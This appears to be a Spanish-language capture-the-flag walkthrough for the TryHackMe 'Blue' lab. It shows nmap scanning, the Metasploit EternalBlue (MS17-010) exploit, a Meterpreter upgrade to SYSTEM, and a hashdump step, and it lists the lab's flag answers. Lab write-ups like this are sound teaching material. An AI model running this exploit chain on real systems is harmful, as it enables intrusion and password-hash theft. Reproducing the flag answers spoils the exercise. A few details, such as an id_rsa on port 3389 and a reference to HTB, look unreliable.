@@ -1,0 +1,126 @@
+TryHackMe
+Blue
+
+nmap
+
+nmap -p 135,139,445,3389,49152,49153,49154,49160 -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.10.167.100 -oN nmap
+
+• 135/tcp open msrpc syn-ack ttl 64 Microsoft Windows RPC
+• 139/tcp open netbios-ssn syn-ack ttl 64 Microsoft Windows netbios-ssn
+• 445/tcp open microsoft-ds syn-ack ttl 64 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+• 3389/tcp open ssl/ms-wbt-server? syn-ack ttl 64
+**Dentro de este puerto encontramos un id_rsa**
+• 49152/tcp open msrpc syn-ack ttl 64 Microsoft Windows RPC
+• 49153/tcp open msrpc syn-ack ttl 64 Microsoft Windows RPC
+• 49154/tcp open msrpc syn-ack ttl 64 Microsoft Windows RPC
+• 49160/tcp open msrpc syn-ack ttl 64 Microsoft Windows RPC
+
+Vemos que es Windows 7 Professional 7601 y buscamos en internet para ver si encontramos alguna vulnerabilidad. Vemos que esta versión de Windows es vulnerable a
+
+MS17-010 EternalBlue
+
+Procederemos a buscar el exploit en Metasploit.
+
+msfconsole
+search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+use 0
+
+show options
+
+Al desplegar las opciones, vemos que necesitamos lo siguiente
+• RHOSTS
+**IP victima
+
+• LHOST
+**IP atacante
+
+set RHOSTS (IP victima)
+
+set LHOST 10.18.112.21
+
+run
+**El exploit se ejecutó exitosamente
+
+Ahora necesitamos ejecutar una shell de Meterpreter, para esto primero tenemos que poner el actual exploit en segundo plano. Esto se logra con el comando "control+z"
+
+^z
+**Confirmamos con Y
+
+Ahora, para chequear que todo esté correcto, utilizamos el siguiente comando
+
+sessions -l
+
+En efecto, está en segundo plano.
+Ahora toca buscar la shell de Meterpreter
+
+search shell_to_meterpreter
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+
+use 0
+
+Vemos las opciones
+
+show options
+
+Vemos que tenemos que setear la SESSION. Como anteriormente vimos la sesión que está en segundo plano tiene el ID 1
+
+set SESSION 1
+
+run
+**Se ejecuta correctamente
+
+Ahora necesitamos elegir la sesión que vamos a utilizar
+
+sessions -l
+
+Vemos que ambas están corriendo
+
+session -i 2
+
+Seleccionamos correctamente la sesión 2, ahora como la consola de Meterpreter nos puede generar algunos problemas como limitarnos a algunos comandos, colocaremos "shell" y esto nos traerá una opción de Meterpreter que entrega una shell completamente funcional
+
+shell
+
+whoami
+• nt authority\system
+Ya estamos dentro, con sesión de root (😃)
+
+Luego de buscar en varias carpetas, encontramos la flag 3
+
+type flag3.txt
+flag{admin_documents_can_be_valuable}
+
+Ahora que sabemos el nombre de las flags, buscaremos desde la raíz para las faltantes
+Primero llegamos a la carpeta C:
+
+dir /s /b flag2.txt
+• C:\Windows\System32\config\flag2.txt
+
+type C:\Windows\System32\config\flag2.txt
+• flag{sam_database_elevated_access}
+
+dir /s /b flag1.txt
+• c:/flag1.txt
+
+type flag1.txt
+• flag{access_the_machine}
+
+Al responder las preguntas de HTB, noté que me faltó un paso. Hay que usar la herramienta incluida en Meterpreter "hashdump" que nos va a traer todas las contraseñas y usuarios de la sesión. Luego hay que decodificar el hash del usuario jon.
